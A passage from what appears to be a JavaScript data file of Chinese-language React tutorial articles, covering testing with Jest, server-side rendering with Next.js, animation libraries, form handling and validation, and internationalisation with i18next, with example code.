import Card from './Card';

describe('Card Snapshot', () => {
  test('matches snapshot', () => {
    const { asFragment } = render(
      <Card title="Test Card" description="This is a test card" />
    );
    expect(asFragment()).toMatchSnapshot();
  });
  
  test('matches snapshot with custom className', () => {
    const { asFragment } = render(
      <Card 
        title="Test Card" 
        description="This is a test card" 
        className="custom-class"
      />
    );
    expect(asFragment()).toMatchSnapshot();
  });
});
\`\`\`

### 测试工具详解

**Jest - 测试框架核心：**
Jest 是 Facebook 开发的 JavaScript 测试框架，提供了完整的测试解决方案。Jest 内置断言库、Mock 功能、快照测试、代码覆盖率报告等功能。Jest 的零配置理念使得开箱即用，同时支持灵活的自定义配置。Jest 的并行测试执行和智能观察模式可以显著提高测试效率。

**React Testing Library - 组件测试最佳实践：**
React Testing Library 是测试 React 组件的推荐工具，它鼓励测试组件行为而非实现细节。通过 queryBy*、getBy*、findBy* 等方法查询 DOM 元素，通过 userEvent 模拟用户交互。Testing Library 的核心理念是"测试应该像用户使用应用一样"，这使得测试更加健壮，不会因为重构而频繁修改。

**MSW - API Mock 利器：**
Mock Service Worker (MSW) 是现代的 API Mock 工具，通过 Service Worker 拦截网络请求。MSW 可以在浏览器和 Node.js 环境中使用，支持 REST 和 GraphQL API。MSW 的优势在于不需要修改应用代码，Mock 的 API 行为与真实 API 一致，测试更加真实可靠。

### 最佳实践

**测试原则：**
测试用户可见的行为，而不是实现细节。使用语义化的查询方法（如 getByRole、getByText）而不是测试 ID。保持测试独立，每个测试应该能够单独运行。测试边界条件和错误情况，而不仅仅是正常流程。

**测试组织：**
使用 describe 嵌套组织相关测试用例。使用 beforeEach 和 afterEach 处理公共的设置和清理。将测试文件放在与被测试文件相同的目录下，命名为 *.test.js 或 *.spec.js。

**持续集成：**
在 CI 流程中运行所有测试，确保代码质量。配置测试覆盖率阈值，低于阈值时构建失败。使用并行测试加速 CI 执行时间。`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-ssr",title:"React 服务端渲染 (SSR) 深度解析",category:"react",difficulty:"hard",tags:["React","SSR","Next.js","性能"],content:`## React 服务端渲染 (SSR) 深度解析

服务端渲染 (SSR) 是提高 React 应用首屏性能和 SEO 的重要技术。与客户端渲染 (CSR) 不同，SSR 在服务器端生成完整的 HTML，然后发送给客户端，用户可以更快地看到页面内容。SSR 对于内容驱动的网站、电商、博客等需要良好 SEO 的应用尤为重要。

### SSR 核心概念

**SSR 工作原理：**
服务端渲染的工作流程包括：服务器接收请求、执行 React 组件渲染、生成完整 HTML、发送给客户端、客户端进行 hydration（激活交互）。Hydration 是 SSR 的关键步骤，React 在客户端重新执行组件，绑定事件处理器，使页面变得可交互。Hydration 过程中，React 会对比服务端渲染的 HTML 和客户端渲染的结果，确保一致性。

**SSR 的优势：**
更快的首屏加载，用户可以更快看到页面内容；更好的 SEO，搜索引擎可以抓取完整的页面内容；支持社交媒体分享，Open Graph 和 Twitter Card 标签可以正确显示；更好的可访问性，屏幕阅读器可以读取完整的页面内容。

**SSR 的挑战：**
服务器负载增加，每次请求都需要渲染；开发复杂度提高，需要处理服务器和客户端环境的差异；某些浏览器 API 不可用，如 window、document；hydration 错误需要特别注意，服务端和客户端渲染结果必须一致。

### 代码示例

\`\`\`javascript
// Next.js App Router - 服务器组件
// app/users/page.tsx
async function UsersPage() {
  // 直接在服务器组件中获取数据
  const users = await fetch('https://api.example.com/users', {
    cache: 'no-store' // 每次请求都重新获取
  }).then(res => res.json());
  
  return (
    <main>
      <h1>Users</h1>
      <ul>
        {users.map(user => (
          <li key={user.id}>{user.name}</li>
        ))}
      </ul>
    </main>
  );
}

// 静态生成 (SSG)
// app/blog/[slug]/page.tsx
export async function generateStaticParams() {
  const posts = await fetch('https://api.example.com/posts').then(res => res.json());
  
  return posts.map(post => ({
    slug: post.slug
  }));
}

async function BlogPost({ params }) {
  const post = await fetch(\`https://api.example.com/posts/\${params.slug}\`, {
    next: { revalidate: 3600 } // ISR: 每小时重新验证
  }).then(res => res.json());
  
  return (
    <article>
      <h1>{post.title}</h1>
      <div dangerouslySetInnerHTML={{ __html: post.content }} />
    </article>
  );
}

// Pages Router - getServerSideProps
export async function getServerSideProps(context) {
  const { params, req, res } = context;
  
  // 设置缓存头
  res.setHeader('Cache-Control', 'public, s-maxage=10, stale-while-revalidate=59');
  
  const data = await fetch(\`https://api.example.com/data/\${params.id}\`);
  const item = await data.json();
  
  return {
    props: { item }
  };
}

function ServerPage({ item }) {
  return <div>{item.name}</div>;
}

// Pages Router - getStaticProps
export async function getStaticProps() {
  const data = await fetch('https://api.example.com/posts');
  const posts = await data.json();
  
  return {
    props: { posts },
    revalidate: 60 // ISR: 60秒后重新生成
  };
}

// Pages Router - getStaticPaths
export async function getStaticPaths() {
  const data = await fetch('https://api.example.com/posts');
  const posts = await data.json();
  
  const paths = posts.map(post => ({
    params: { id: post.id.toString() }
  }));
  
  return {
    paths,
    fallback: 'blocking' // 或 true, false
  };
}

// 自定义 SSR 服务器
import express from 'express';
import React from 'react';
import { renderToString } from 'react-dom/server';
import App from './App';

const app = express();

app.get('*', (req, res) => {
  const context = {};
  
  const html = renderToString(
    <StaticRouter location={req.url} context={context}>
      <App />
    </StaticRouter>
  );
  
  if (context.url) {
    res.redirect(context.url);
    return;
  }
  
  res.send(\`
    <!DOCTYPE html>
    <html>
      <head>
        <title>SSR App</title>
      </head>
      <body>
        <div id="root">\${html}</div>
        <script src="/client.js"></script>
      </body>
    </html>
  \`);
});

// Hydration
import { hydrateRoot } from 'react-dom/client';
import App from './App';

hydrateRoot(document.getElementById('root'), <App />);

// 流式 SSR
import { renderToPipeableStream } from 'react-dom/server';

app.get('*', (req, res) => {
  const { pipe } = renderToPipeableStream(
    <App />,
    {
      bootstrapScripts: ['/client.js'],
      onShellReady() {
        res.setHeader('Content-Type', 'text/html');
        pipe(res);
      },
      onShellError(error) {
        res.status(500).send('Error');
      }
    }
  );
});

// 客户端组件与 SSR 配合
'use client';

import { useState, useEffect } from 'react';

function ClientComponent() {
  const [data, setData] = useState(null);
  
  useEffect(() => {
    // 只在客户端执行
    fetch('/api/data')
      .then(res => res.json())
      .then(setData);
  }, []);
  
  if (!data) return <div>Loading...</div>;
  
  return <div>{data.message}</div>;
}

// 服务器组件中嵌入客户端组件
async function ServerComponent() {
  const initialData = await fetchInitialData();
  
  return (
    <div>
      <h1>Server Rendered</h1>
      <ClientComponent initialData={initialData} />
    </div>
  );
}

// 处理 SSR 中的环境差异
function SafeComponent() {
  const [isClient, setIsClient] = useState(false);
  
  useEffect(() => {
    setIsClient(true);
  }, []);
  
  return (
    <div>
      {isClient ? (
        <ClientOnlyFeature />
      ) : (
        <ServerFallback />
      )}
    </div>
  );
}

// 动态导入避免 SSR
const DynamicComponent = dynamic(() => import('./ClientOnlyComponent'), {
  ssr: false,
  loading: () => <p>Loading...</p>
});
\`\`\`

### Next.js 渲染模式详解

**静态生成 (SSG)：**
静态生成在构建时生成 HTML 文件，适合内容不经常变化的页面。SSG 提供了最佳的性能，因为 HTML 文件可以直接由 CDN 分发。使用 getStaticProps 获取数据，使用 getStaticPaths 生成动态路由。SSG 适合博客、文档、产品列表等场景。

**服务端渲染 (SSR)：**
服务端渲染在每次请求时生成 HTML，适合内容经常变化的页面。SSR 提供了良好的 SEO 和首屏性能，但会增加服务器负载。使用 getServerSideProps 获取数据。SSR 适合新闻、电商、社交媒体等场景。

**增量静态再生 (ISR)：**
ISR 结合了 SSG 和 SSR 的优点，初始时使用静态页面，当数据变化时重新生成特定页面。ISR 通过 revalidate 属性设置重新生成的时间间隔。ISR 适合内容定期更新的场景，如博客、新闻、电商等。

### 性能优化策略

**代码分割：**
使用动态导入 (dynamic import) 按需加载组件，减少初始加载体积。Next.js 自动按路由分割代码，也可以手动分割大型组件。

**缓存策略：**
合理设置 HTTP 缓存头，使用 CDN 缓存静态资源。对于 ISR 页面，设置合适的 revalidate 时间。使用 Cache-Control 头控制浏览器缓存行为。

**流式渲染：**
使用 renderToPipeableStream 或 renderToReadableStream 实现流式 SSR，逐步发送 HTML 到客户端，用户可以更快看到内容。配合 Suspense 实现组件级别的流式渲染。

**预加载和预取：**
使用 <link rel="preload"> 预加载关键资源。Next.js 的 <Link> 组件自动预取链接页面。使用 router.prefetch() 手动预取页面。`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-animation",title:"React 动画实现与性能优化",category:"react",difficulty:"medium",tags:["React","动画","CSS","性能"],content:`## React 动画实现与性能优化

动画是提升用户体验的重要手段，精心设计的动画可以引导用户注意力、提供视觉反馈、增强应用的交互感。React 提供了多种动画实现方式，从简单的 CSS 过渡到复杂的物理动画，开发者可以根据需求选择合适的方案。

### 动画实现方式详解

**CSS 动画 - 高性能基础方案：**
CSS 动画是实现动画效果的基础方案，包括 CSS Transitions 和 CSS Animations 两种方式。CSS Transitions 适合简单的状态变化动画，如悬停效果、展开收起等，通过 transition 属性定义过渡效果。CSS Animations 适合复杂的动画序列，通过 @keyframes 定义关键帧动画。CSS 动画的性能优势在于可以利用 GPU 加速，特别是 transform 和 opacity 属性的变化只触发合成层，不会导致重排和重绘。

**React 状态驱动动画：**
使用 useState 和 useEffect 控制动画状态，可以实现复杂的动画逻辑，与业务逻辑紧密结合。通过状态变化触发 CSS 类名切换，实现声明式的动画控制。这种方式适合需要根据数据状态动态变化的动画，如列表项的添加删除、模态框的显示隐藏等。

**第三方动画库：**
Framer Motion 是 React 生态中最流行的动画库，提供了声明式的动画 API，支持布局动画、手势动画、页面过渡等高级功能。React Spring 是基于物理的动画库，使用真实的物理弹簧模拟，动画效果更自然流畅。Lottie 可以将 Adobe After Effects 导出的 JSON 动画在 Web 端渲染，适合复杂的矢量动画。

### 代码示例

\`\`\`javascript
// CSS 过渡动画
import './styles.css';

function FadeInComponent({ isVisible }) {
  return (
    <div className={\`fade-container \${isVisible ? 'visible' : ''}\`}>
      <p>Content fades in and out</p>
    </div>
  );
}

// styles.css
// .fade-container {
//   opacity: 0;
//   transition: opacity 0.3s ease-in-out;
// }
// .fade-container.visible {
//   opacity: 1;
// }

// CSS 关键帧动画
function Spinner() {
  return <div className="spinner" />;
}

// styles.css
// @keyframes spin {
//   from { transform: rotate(0deg); }
//   to { transform: rotate(360deg); }
// }
// .spinner {
//   width: 40px;
//   height: 40px;
//   border: 4px solid #f3f3f3;
//   border-top: 4px solid #3498db;
//   border-radius: 50%;
//   animation: spin 1s linear infinite;
// }

// React 状态驱动动画
function AnimatedList({ items }) {
  const [displayItems, setDisplayItems] = useState(items);
  
  const addItem = (item) => {
    setDisplayItems(prev => [...prev, { ...item, isNew: true }]);
    setTimeout(() => {
      setDisplayItems(prev => 
        prev.map(i => i.id === item.id ? { ...i, isNew: false } : i)
      );
    }, 300);
  };
  
  return (
    <ul className="animated-list">
      {displayItems.map(item => (
        <li 
          key={item.id} 
          className={\`list-item \${item.isNew ? 'item-enter' : ''}\`}
        >
          {item.name}
        </li>
      ))}
    </ul>
  );
}

// Framer Motion 基础用法
import { motion, AnimatePresence } from 'framer-motion';

function MotionComponent() {
  const [isVisible, setIsVisible] = useState(true);
  
  return (
    <div>
      <button onClick={() => setIsVisible(!isVisible)}>
        Toggle
      </button>
      <AnimatePresence>
        {isVisible && (
          <motion.div
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 20 }}
            transition={{ duration: 0.3 }}
          >
            <p>Animated content</p>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

// Framer Motion 列表动画
function MotionList({ items }) {
  return (
    <ul>
      <AnimatePresence>
        {items.map((item, index) => (
          <motion.li
            key={item.id}
            initial={{ opacity: 0, x: -50 }}
            animate={{ opacity: 1, x: 0 }}
            exit={{ opacity: 0, x: 50 }}
            transition={{ delay: index * 0.1 }}
            layout
          >
            {item.name}
          </motion.li>
        ))}
      </AnimatePresence>
    </ul>
  );
}

// Framer Motion 手势动画
function DraggableCard() {
  return (
    <motion.div
      drag
      dragConstraints={{ left: -100, right: 100, top: -100, bottom: 100 }}
      dragElastic={0.2}
      whileHover={{ scale: 1.05 }}
      whileTap={{ scale: 0.95 }}
      className="card"
    >
      Drag me!
    </motion.div>
  );
}

// React Spring 物理动画
import { useSpring, animated } from '@react-spring/web';

function SpringComponent() {
  const [flip, setFlip] = useState(false);
  
  const { transform, opacity } = useSpring({
    opacity: flip ? 1 : 0,
    transform: \`perspective(600px) rotateX(\${flip ? 180 : 0}deg)\`,
    config: { mass: 5, tension: 500, friction: 80 }
  });
  
  return (
    <animated.div
      onClick={() => setFlip(!flip)}
      style={{ opacity: opacity.to(o => 1 - o), transform }}
    >
      Click to flip
    </animated.div>
  );
}

// React Spring 数字动画
function AnimatedNumber({ value }) {
  const { number } = useSpring({
    from: { number: 0 },
    number: value,
    delay: 200,
    config: { mass: 1, tension: 20, friction: 10 }
  });
  
  return <animated.span>{number.to(n => n.toFixed(2))}</animated.span>;
}

// Lottie 动画
import Lottie from 'lottie-react';
import animationData from './animation.json';

function LottieAnimation() {
  const [isPlaying, setIsPlaying] = useState(true);
  
  return (
    <div>
      <Lottie 
        animationData={animationData}
        loop={true}
        autoplay={isPlaying}
        style={{ width: 200, height: 200 }}
      />
      <button onClick={() => setIsPlaying(!isPlaying)}>
        {isPlaying ? 'Pause' : 'Play'}
      </button>
    </div>
  );
}

// 页面过渡动画
import { motion } from 'framer-motion';

const pageVariants = {
  initial: { opacity: 0, x: '-100vw' },
  in: { opacity: 1, x: 0 },
  out: { opacity: 0, x: '100vw' }
};

const pageTransition = {
  type: 'tween',
  ease: 'anticipate',
  duration: 0.5
};

function PageTransition({ children }) {
  return (
    <motion.div
      initial="initial"
      animate="in"
      exit="out"
      variants={pageVariants}
      transition={pageTransition}
    >
      {children}
    </motion.div>
  );
}

// 性能优化：使用 transform 和 opacity
function OptimizedAnimation() {
  const [isExpanded, setIsExpanded] = useState(false);
  
  return (
    <div 
      className="optimized-container"
      style={{
        transform: isExpanded ? 'scale(1.1)' : 'scale(1)',
        opacity: isExpanded ? 0.8 : 1,
        transition: 'transform 0.3s ease, opacity 0.3s ease',
        willChange: 'transform, opacity'
      }}
      onClick={() => setIsExpanded(!isExpanded)}
    >
      Optimized Animation
    </div>
  );
}
\`\`\`

### 性能优化策略

**使用 GPU 加速属性：**
transform 和 opacity 是唯一只触发合成的 CSS 属性，不会导致重排和重绘。优先使用 translate、scale、rotate 代替 top、left、width、height 等属性。使用 will-change 属性提前告知浏览器元素将要变化，让浏览器提前优化，但不要过度使用，因为会占用额外内存。

**避免动画性能陷阱：**
避免在动画中频繁读取布局属性（如 offsetWidth、getBoundingClientRect），这会强制同步布局。使用 requestAnimationFrame 进行动画循环，确保动画帧率与屏幕刷新率同步。对于复杂的动画，考虑使用 Web Animations API 或 CSS Animations，它们比 JavaScript 动画更高效。

**React 动画最佳实践：**
使用 React.memo 避免动画组件的不必要重新渲染。将动画状态与业务状态分离，避免动画触发业务逻辑更新。使用 CSS 变量动态控制动画参数，减少 JavaScript 计算。对于长列表动画，使用虚拟列表减少 DOM 节点数量。

### 可访问性考虑

动画设计需要考虑可访问性，尊重用户的 prefers-reduced-motion 设置。使用 CSS 媒体查询 @media (prefers-reduced-motion: reduce) 禁用或简化动画。提供动画开关选项，让用户可以自主选择。确保动画不会导致内容闪烁或引起光敏性癫痫。`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-forms",title:"React 表单处理最佳实践",category:"react",difficulty:"medium",tags:["React","表单","状态管理","验证"],content:`## React 表单处理最佳实践

表单是用户与应用交互的重要方式，表单处理涉及状态管理、验证、错误处理、提交等多个方面。React 提供了受控组件和非受控组件两种表单处理方式，同时社区也提供了丰富的表单处理库，开发者可以根据需求选择合适的方案。

### 表单实现方式详解

**受控组件：**
受控组件是指表单值由 React 状态控制的组件。每个表单元素都有一个对应的状态，通过 onChange 事件更新状态，通过 value 属性设置表单值。受控组件的优势在于：可以实时验证用户输入、可以动态修改输入值、可以禁用提交按钮直到表单有效、可以实现复杂的表单逻辑。受控组件的缺点是对于大型表单，需要管理大量状态，代码可能变得冗长。

**非受控组件：**
非受控组件是指表单值由 DOM 控制的组件，通过 ref 访问表单值。非受控组件更接近传统 HTML 表单的处理方式，适合简单的表单场景。非受控组件的优势在于：代码简洁、不需要管理大量状态、可以与第三方库集成。非受控组件的缺点是难以实现实时验证和动态修改。

**第三方表单库：**
React Hook Form 是高性能的表单库，采用受控组件与非受控组件混合的方式，最大限度地减少不必要的重新渲染。Formik 是功能丰富的表单库，提供了表单状态管理、验证、错误提示等完整解决方案。Zod 是 TypeScript 优先的验证库，可以与 React Hook Form 配合使用，提供类型安全的表单验证。

### 代码示例

\`\`\`javascript
// 受控组件
function ControlledForm() {
  const [formData, setFormData] = useState({
    username: '',
    email: '',
    password: ''
  });
  const [errors, setErrors] = useState({});
  
  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
    
    // 实时验证
    validateField(name, value);
  };
  
  const validateField = (name, value) => {
    let error = '';
    
    switch (name) {
      case 'username':
        if (!value) error = 'Username is required';
        else if (value.length < 3) error = 'Username must be at least 3 characters';
        break;
      case 'email':
        if (!value) error = 'Email is required';
        else if (!/^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test(value)) error = 'Invalid email';
        break;
      case 'password':
        if (!value) error = 'Password is required';
        else if (value.length < 8) error = 'Password must be at least 8 characters';
        break;
    }
    
    setErrors(prev => ({ ...prev, [name]: error }));
  };
  
  const handleSubmit = (e) => {
    e.preventDefault();
    
    // 验证所有字段
    Object.keys(formData).forEach(key => {
      validateField(key, formData[key]);
    });
    
    if (Object.values(errors).every(e => !e)) {
      console.log('Form submitted:', formData);
    }
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <div>
        <label>Username</label>
        <input
          name="username"
          value={formData.username}
          onChange={handleChange}
        />
        {errors.username && <span>{errors.username}</span>}
      </div>
      
      <div>
        <label>Email</label>
        <input
          name="email"
          type="email"
          value={formData.email}
          onChange={handleChange}
        />
        {errors.email && <span>{errors.email}</span>}
      </div>
      
      <div>
        <label>Password</label>
        <input
          name="password"
          type="password"
          value={formData.password}
          onChange={handleChange}
        />
        {errors.password && <span>{errors.password}</span>}
      </div>
      
      <button type="submit">Submit</button>
    </form>
  );
}

// 非受控组件
function UncontrolledForm() {
  const usernameRef = useRef(null);
  const emailRef = useRef(null);
  const fileRef = useRef(null);
  
  const handleSubmit = (e) => {
    e.preventDefault();
    
    const formData = {
      username: usernameRef.current.value,
      email: emailRef.current.value,
      file: fileRef.current.files[0]
    };
    
    console.log('Form submitted:', formData);
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <div>
        <label>Username</label>
        <input ref={usernameRef} defaultValue="" />
      </div>
      
      <div>
        <label>Email</label>
        <input ref={emailRef} type="email" defaultValue="" />
      </div>
      
      <div>
        <label>File</label>
        <input ref={fileRef} type="file" />
      </div>
      
      <button type="submit">Submit</button>
    </form>
  );
}

// React Hook Form 基础用法
import { useForm } from 'react-hook-form';

function ReactHookForm() {
  const { 
    register, 
    handleSubmit, 
    formState: { errors, isSubmitting },
    reset 
  } = useForm({
    defaultValues: {
      username: '',
      email: '',
      password: ''
    }
  });
  
  const onSubmit = async (data) => {
    try {
      await fetch('/api/register', {
        method: 'POST',
        body: JSON.stringify(data)
      });
      reset();
    } catch (error) {
      console.error(error);
    }
  };
  
  return (
    <form onSubmit={handleSubmit(onSubmit)}>
      <div>
        <label>Username</label>
        <input
          {...register('username', {
            required: 'Username is required',
            minLength: {
              value: 3,
              message: 'Username must be at least 3 characters'
            }
          })}
        />
        {errors.username && <span>{errors.username.message}</span>}
      </div>
      
      <div>
        <label>Email</label>
        <input
          type="email"
          {...register('email', {
            required: 'Email is required',
            pattern: {
              value: /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/,
              message: 'Invalid email address'
            }
          })}
        />
        {errors.email && <span>{errors.email.message}</span>}
      </div>
      
      <div>
        <label>Password</label>
        <input
          type="password"
          {...register('password', {
            required: 'Password is required',
            minLength: {
              value: 8,
              message: 'Password must be at least 8 characters'
            }
          })}
        />
        {errors.password && <span>{errors.password.message}</span>}
      </div>
      
      <button type="submit" disabled={isSubmitting}>
        {isSubmitting ? 'Submitting...' : 'Submit'}
      </button>
    </form>
  );
}

// React Hook Form + Zod 验证
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';

const schema = z.object({
  username: z.string().min(3, 'Username must be at least 3 characters'),
  email: z.string().email('Invalid email address'),
  password: z.string().min(8, 'Password must be at least 8 characters'),
  confirmPassword: z.string()
}).refine(data => data.password === data.confirmPassword, {
  message: "Passwords don't match",
  path: ['confirmPassword']
});

function FormWithZod() {
  const { 
    register, 
    handleSubmit, 
    formState: { errors } 
  } = useForm({
    resolver: zodResolver(schema)
  });
  
  return (
    <form onSubmit={handleSubmit(console.log)}>
      <input {...register('username')} />
      {errors.username && <span>{errors.username.message}</span>}
      
      <input type="email" {...register('email')} />
      {errors.email && <span>{errors.email.message}</span>}
      
      <input type="password" {...register('password')} />
      {errors.password && <span>{errors.password.message}</span>}
      
      <input type="password" {...register('confirmPassword')} />
      {errors.confirmPassword && <span>{errors.confirmPassword.message}</span>}
      
      <button type="submit">Submit</button>
    </form>
  );
}

// 复杂表单：动态字段
function DynamicForm() {
  const { register, control, handleSubmit } = useForm({
    defaultValues: {
      items: [{ name: '', quantity: 1 }]
    }
  });
  
  const { fields, append, remove } = useFieldArray({
    control,
    name: 'items'
  });
  
  return (
    <form onSubmit={handleSubmit(console.log)}>
      {fields.map((field, index) => (
        <div key={field.id}>
          <input
            {...register(\`items.\${index}.name\`)}
            placeholder="Item name"
          />
          <input
            type="number"
            {...register(\`items.\${index}.quantity\`)}
            placeholder="Quantity"
          />
          <button type="button" onClick={() => remove(index)}>
            Remove
          </button>
        </div>
      ))}
      
      <button type="button" onClick={() => append({ name: '', quantity: 1 })}>
        Add Item
      </button>
      
      <button type="submit">Submit</button>
    </form>
  );
}

// 表单状态管理最佳实践
function OptimizedForm() {
  // 使用 useCallback 缓存处理函数
  const handleChange = useCallback((e) => {
    // 处理逻辑
  }, []);
  
  // 使用 useMemo 缓存验证结果
  const isValid = useMemo(() => {
    return formData.username && formData.email && !Object.keys(errors).length;
  }, [formData, errors]);
  
  // 防抖输入
  const debouncedSearch = useMemo(
    () => debounce((value) => {
      // 搜索逻辑
    }, 300),
    []
  );
  
  return (
    <form>
      {/* 表单内容 */}
    </form>
  );
}
\`\`\`

### 表单验证策略

**客户端验证：**
客户端验证可以提供即时反馈，减少服务器负担。常见的验证时机包括：即时验证（onChange）、失焦验证（onBlur）、提交验证（onSubmit）。即时验证适合需要实时反馈的字段，如密码强度；失焦验证适合需要用户完成输入后再验证的字段；提交验证确保所有字段都通过验证后才提交。

**服务器端验证：**
服务器端验证是最终验证保障，防止恶意提交和处理复杂的验证逻辑。服务器端验证应该返回详细的错误信息，包括哪个字段验证失败以及失败原因。前端应该正确处理服务器返回的验证错误，显示给用户。

### 性能优化

**减少重新渲染：**
使用 React Hook Form 的 Controller 组件可以将表单状态隔离，避免整个表单重新渲染。对于大型表单，可以将表单拆分为多个子组件，每个子组件管理自己的状态。

**防抖和节流：**
对于搜索输入等需要频繁触发验证的场景，使用防抖（debounce）延迟验证。对于滚动加载等场景，使用节流（throttle）限制触发频率。

**批量更新：**
React 18 的自动批处理可以将多个状态更新合并为一次渲染。对于复杂的表单状态更新，可以使用 useReducer 集中管理状态。`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-i18n",title:"React 国际化 (i18n) 最佳实践",category:"react",difficulty:"medium",tags:["React","国际化","i18n","本地化"],content:`## React 国际化 (i18n) 最佳实践

国际化（Internationalization，简称 i18n）是构建全球应用的重要环节。一个优秀的国际化方案不仅要支持多语言翻译，还需要处理日期时间格式、数字格式、货币符号、复数规则、文字方向等复杂问题。React 提供了多种国际化方案，选择合适的方案对项目的可维护性和用户体验至关重要。

### 国际化库对比

**i18next - 功能最全面的国际化方案：**
- 功能丰富，生态完整，支持 React、Vue、Angular 等多种框架
- 支持复数、插值、嵌套翻译、命名空间等高级功能
- 提供浏览器语言检测、后端加载、缓存等插件
- 支持服务端渲染（SSR）和静态站点生成（SSG）
- 社区活跃，文档完善，是 React 国际化的首选方案

\`\`\`typescript
// i18next 配置示例
import i18n from 'i18next';
import { initReactI18next } from 'react-i18next';
import LanguageDetector from 'i18next-browser-languagedetector';
import HttpBackend from 'i18next-http-backend';

i18n
  .use(HttpBackend) // 从服务器加载翻译文件
  .use(LanguageDetector) // 检测用户语言
  .use(initReactI18next) // 绑定 react-i18next
  .init({
    fallbackLng: 'en', // 默认语言
    supportedLngs: ['en', 'zh', 'ja', 'ko'],
    
    ns: ['common', 'home', 'about'], // 命名空间
    defaultNS: 'common',
    
    backend: {
      loadPath: '/locales/{{lng}}/{{ns}}.json', // 翻译文件路径
    },
    
    detection: {
      order: ['querystring', 'cookie', 'localStorage', 'navigator'],
      caches: ['cookie', 'localStorage'],
    },
    
    interpolation: {
      escapeValue: false, // React 已经处理 XSS
    },
    
    react: {
      useSuspense: true, // 使用 Suspense 加载翻译
    },
  });

export default i18n;
\`\`\`

**react-intl - Airbnb 出品的国际化方案：**
- Airbnb 开发的 React 国际化解决方案，专注于格式化
- 基于 ICU 消息格式，支持复杂的复数和性别规则
- 提供 FormattedMessage、FormattedDate、FormattedNumber 等组件
- 支持 React 和 React Native，API 设计一致
- 适合需要复杂格式化的应用，如电商、金融类应用

\`\`\`typescript
// react-intl 配置示例
import { IntlProvider, FormattedMessage, FormattedNumber, FormattedDate } from 'react-intl';

const messages = {
  en: {
    greeting: 'Hello, {name}!',
    items: '{count, plural, one {# item} other {# items}}',
    income: '{gender, select, male {He earns} female {She earns} other {They earn}} {amount}',
  },
  zh: {
    greeting: '你好，{name}！',
    items: '{count} 个项目',
    income: '{gender, select, male {他赚} female {她赚} other {他们赚}} {amount}',
  },
};

function App() {
  const [locale, setLocale] = useState('en');
  
  return (
    <IntlProvider locale={locale} messages={messages[locale]}>
      <div>
        <FormattedMessage id="greeting" values={{ name: 'Alice' }} />
        <FormattedNumber value={1234.56} style="currency" currency="USD" />
        <FormattedDate value={new Date()} year="numeric" month="long" day="numeric" />
      </div>
    </IntlProvider>
  );
}
\`\`\`

**Format.js - 底层格式化工具集：**
- 一套国际化工具集，react-intl 的底层依赖
- 支持格式化日期、数字、货币、相对时间等
- 提供 ICU 消息格式的完整实现
- 可以独立使用，也可以与其他国际化库配合

### 实现策略

**消息管理最佳实践：**
- 集中管理翻译文件，使用 JSON 或 YAML 格式存储
- 按功能模块划分命名空间，避免单个文件过大
- 支持动态加载翻译文件，减少初始加载体积
- 使用翻译管理工具（如 Crowdin、Lokalise）协作翻译

\`\`\`typescript
// 翻译文件结构示例
// /locales/en/common.json
{
  "welcome": "Welcome to our app",
  "navigation": {
    "home": "Home",
    "about": "About",
    "contact": "Contact"
  },
  "errors": {
    "required": "This field is required",
    "invalidEmail": "Please enter a valid email address"
  }
}

// /locales/zh/common.json
{
  "welcome": "欢迎使用我们的应用",
  "navigation": {
    "home": "首页",
    "about": "关于我们",
    "contact": "联系我们"
  },
  "errors": {
    "required": "此字段为必填项",
    "invalidEmail": "请输入有效的电子邮件地址"
  }
}

// 组件中使用翻译
import { useTranslation } from 'react-i18next';

function Navigation() {
  const { t } = useTranslation('common');
  
  return (
    <nav>
      <Link to="/">{t('navigation.home')}</Link>
      <Link to="/about">{t('navigation.about')}</Link>
      <Link to="/contact">{t('navigation.contact')}</Link>
    </nav>
  );
}
\`\`\`

**语言检测策略：**
- 从 URL 参数检测（如 ?lang=zh），适合 SEO 和分享链接
- 从浏览器设置检测（navigator.language），提供默认语言
- 从用户偏好检测（localStorage/cookie），记住用户选择
- 优先级：URL 参数 > 用户偏好 > 浏览器设置 > 默认语言

\`\`\`typescript
// 语言切换组件
import { useTranslation } from 'react-i18next';

function LanguageSwitcher() {
  const { i18n } = useTranslation();
  
  const changeLanguage = (lng: string) => {
    i18n.changeLanguage(lng);
    // 保存用户偏好
    localStorage.setItem('preferredLanguage', lng);
    // 更新 URL 参数
    const url = new URL(window.location.href);
    url.searchParams.set('lang', lng);
    window.history.replaceState({}, '', url.toString());
  };
  
  return (
    <div className="language-switcher">
      <button 
        onClick={() => changeLanguage('en')}
        className={i18n.language === 'en' ? 'active' : ''}
      >
        English
      </button>
      <button 
        onClick={() => changeLanguage('zh')}
        className={i18n.language === 'zh' ? 'active' : ''}
      >
        中文
      </button>
    </div>
  );
}
\`\`\`

**文本提取与翻译工作流：**
- 使用 i18next-scanner 或 babel-plugin-react-intl 自动提取文本
- 支持批量翻译，导出为 XLIFF 或 CSV 格式
- 与翻译服务集成，自动化翻译流程
- 使用 CI/CD 检查翻译完整性

\`\`\`javascript
// i18next-scanner 配置
module.exports = {
  input: ['src/**/*.{js,jsx,ts,tsx}'],
  output: 'public/locales',
  options: {
    debug: true,
    sort: true,
    func: {
      list: ['t', 'i18n.t'],
      extensions: ['.js', '.jsx', '.ts', '.tsx'],
    },
    trans: {
      component: 'Trans',
      i18nKey: 'i18nKey',
      defaultsKey: 'defaults',
      extensions: ['.js', '.jsx', '.ts', '.tsx'],
    },
    lngs: ['en', 'zh', 'ja'],
    ns: ['common', 'home'],
    defaultLng: 'en',
    defaultNs: 'common',
  },
};
\`\`\`

### 性能优化

**懒加载翻译文件：**
- 按需加载翻译文件，减少初始加载体积
- 使用命名空间分隔翻译，按页面或功能加载
- 配合 React Suspense 提供加载状态

\`\`\`typescript
// 懒加载翻译配置
i18n
  .use(HttpBackend)
  .use(initReactI18next)
  .init({
